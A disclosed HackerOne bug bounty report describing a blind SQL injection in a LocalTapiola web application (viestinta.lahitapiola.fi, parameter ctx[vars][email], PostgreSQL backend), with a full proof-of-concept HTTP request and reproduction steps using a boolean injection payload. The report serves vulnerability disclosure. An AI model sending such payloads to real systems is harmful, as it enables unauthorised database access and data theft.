@@ -1,0 +1,45 @@
+ReportLink:https://hackerone.com/reports/181803
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/bobrov
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:1350.0
+Severity:medium
+State:Closed
+DateOfDisclosure:08.12.2016 13:19:18
+
+Summary:
+##Issue
+
+The reporter found an SQL injection in one of the applications in viestinta.lahitapiola.fi. 
+
+##Fix
+
+The issue was investigated and found to be valid and critical. 
+
+##Reasoning
+
+The reported case was valid and right on target for the scope of the bug bounty program. SQL injections are always critical as they pose a serious threat to the underlying database and the information therein. Even in the case of the data being public information - as was the case here -  there are still many vectors for seriously misusing this kind of a vulnerability. 
+
+The bounty decision was based on the fact that the reporter found two very similar vulnerabilities (a pattern issue, #181803 and #181826) -  the bounty was bundled and then split amongst both reports.
+**Vulnerable script**: /webApp/oma_conf
+**Vulnerable parameter**: ctx[vars][email]
+**Database**: PostgreSQL
+
+**PoC**
+```http
+POST /webApp/oma_conf HTTP/1.1
+Host: viestinta.lahitapiola.fi
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1131
+
+ctx=%3Cctx+lang%3D%22en%22+date%3D%222016-11-12T17%3A33%3A06Z%22+_target%3D%22web%22+webApp-id%3D%22235234841%22+_folderModel%3D%22nmsRecipient%22%3E%3CuserInfo+datakitInDatabase%3D%22true%22+homeDir%3D%22%22+instanceLocale%3D%22en-US%22+locale%3D%22en-US%22+login%3D%22webapp%22+loginCS%3D%22Web+applications+agent+%28webapp%29%22+loginId%3D%223290%22+noConsoleCnx%3D%22true%22+orgUnitId%3D%220%22+theme%3D%22%22+timezone%3D%22Europe%2FHelsinki%22+xmlns%3ASOAP-ENV%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22+xmlns%3Ans%3D%22urn%3Axtk%3Asession%22+xmlns%3Axsd%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema%22+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22%3E%3Clogin-right+right%3D%22admin%22%2F%3E%3C%2FuserInfo%3E%3Ctimezone+current%3D%22Europe%2FHelsinki%22+changed%3D%22false%22%2F%3E%3Cvars%3E%3CcustomerId%3E0%3C%2FcustomerId%3E%3Caction%3Ein%3C%2Faction%3E
+%3Cemail%3Etest%40test.ru' and substr(version(),1,10) = 'PostgreSQL' and '1%3C%2Femail%3E
+%3C%2Fvars%3E%3CactivityHistory%3E%3Cactivity+name%3D%22page%22%2F%3E%3C%2FactivityHistory%3E%3C%2Fctx%3E&userAction=next&transition=
+```
+
+**Steps to reproduce**
+1. Open http://viestinta.lahitapiola.fi/webApp/oma_conf
+2. Fill in the form value `' and substr(version(),1,10) = 'PostgreSQL' and '1`
+3. Result `Kiitos tilauksestasi!`
+4. Fill in the form value `' and substr(version(),1,10) = 'PostgreXXX' and '1`
+5. Result `An error occurred.`
